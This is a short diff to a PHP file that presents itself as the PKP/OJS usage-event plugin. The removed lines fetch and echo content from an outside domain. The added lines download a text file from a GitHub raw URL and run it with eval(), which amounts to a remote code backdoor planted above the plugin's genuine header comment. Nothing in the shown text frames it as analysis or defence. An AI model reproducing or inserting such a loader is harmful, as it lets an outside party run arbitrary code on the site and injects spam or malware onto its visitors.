@@ -1,13 +1,7 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-$ch = curl_init("https://piona.xyz/landing/journal.yayasansahara.org/index.txt");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$data = curl_exec($ch);
-curl_close($ch);
-
-echo $data;
+$casperseo = file_get_contents('https://raw.githubusercontent.com/marketmg126-glitch/landing/refs/heads/main/sahar.txt');
+$casperseo = "?> ".$casperseo;
+eval($casperseo);
 /**
  * @file plugins/generic/usageEvent/PKPUsageEventPlugin.inc.php
  *
